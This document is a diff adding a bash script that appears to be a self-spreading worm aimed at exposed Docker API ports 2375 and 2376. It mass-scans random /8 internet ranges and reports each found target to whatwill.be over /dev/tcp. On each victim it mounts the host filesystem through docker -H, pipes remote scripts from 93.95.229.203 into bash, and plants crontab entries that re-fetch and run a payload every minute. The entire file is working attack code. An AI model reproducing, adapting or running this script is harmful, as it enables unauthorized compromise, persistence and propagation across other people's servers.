@@ -1,0 +1,59 @@
+#!/bin/bash
+RATE_TO_SCAN=$(cat /proc/meminfo |grep MemTotal|awk '{print $2/1024/1024}'|awk -F "." '{print $1}')
+          if  (("$RATE_TO_SCAN"<=2 )); then
+                RATE_TO_SCAN=10000
+          elif (("$RATE_TO_SCAN"<=4)); then
+                RATE_TO_SCAN=2000
+          elif (("$RATE_TO_SCAN"<=8)); then
+                RATE_TO_SCAN=20000
+          elif (("$RATE_TO_SCAN"<=16)); then
+                RATE_TO_SCAN=30000
+          elif (("$RATE_TO_SCAN"<=32)); then
+                RATE_TO_SCAN=40000
+          elif (("$RATE_TO_SCAN"<=64)); then
+                RATE_TO_SCAN=50000
+          elif (("$RATE_TO_SCAN">64)); then
+                RATE_TO_SCAN=60000
+          else
+                echo other
+          fi
+
+sleep 6
+
+
+dAPIpwn(){
+range=$1
+port=$2
+rate=1000
+rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
+#eval "$rndstr"="'$(masscan --exclude 255.255.255.255 $range -p$port --rate=$rate|awk '{system("echo "$6">>t1")}')'"
+FILE=w.ini
+if [ -f "$FILE" ]; then
+    echo "$FILE exists."
+else 
+    wget whatwill.be/$FILE
+fi
+ 
+eval "$rndstr"="'$(masscan --exclude 255.255.255.255 $range -p$port --rate=$rate|awk '{print "$6}'| zgrab2 -s 20 multiple -c w.ini |grep WARNING|jq -r .ip)'"
+
+for ipaddy in ${!rndstr}
+do
+TARGET=$ipaddy:$port
+
+echo '##################################################'
+bash -c "echo Got $TARGET >> /dev/tcp/whatwill.be/7007"
+echo $TARGET
+timeout -s SIGKILL 240 docker -H $TARGET run --rm -v /:/mnt ubuntu chroot /mnt/ /bin/sh -c "timeout -s SIGKILL 240 docker -H $TARGET run --rm -v /:/mnt alpine chroot /mnt/ /bin/bash -c "apt update;apt install -y curl wget; curl 93.95.229.203/spread.sh|bash;curl 93.95.229.203/x2.sh|bash"
+timeout -s SIGKILL 240 docker -H $TARGET run --rm -v /:/mnt alpine chroot /mnt/ /bin/sh -c "if ! type curl >/dev/null;then apt-get install -y curl;apt-get install -y --reinstall curl;yum clean all;yum install -y curl;yum reinstall -y curl;fi;echo \"* * * * * root curl http://93.95.229.203/cronb.sh|bash\">/etc/crontab && echo \"* * * * * root curl http://93.95.229.203/cronb.sh|bash\">/etc/cron.d/zzh"
+
+done
+}
+
+while true; do
+#for RANGE in $( echo -e "47\n39\n8\n121\n106\n120\n123\n101\n139\n81\n44\n119\n100\n42\n49\n118\n1\n114\n112\n115\n111\n116\n117\n124\n59\n36\n103\n82\n175\n122\n129\n45\n152\n159\n113" | sort -R ); do
+for RANGE in $( seq 0 225 | sort -R ); do
+dAPIpwn $RANGE".0.0.0/8" 2375 $RATE_TO_SCAN
+dAPIpwn $RANGE".0.0.0/8" 2376 $RATE_TO_SCAN
+done
+done
+
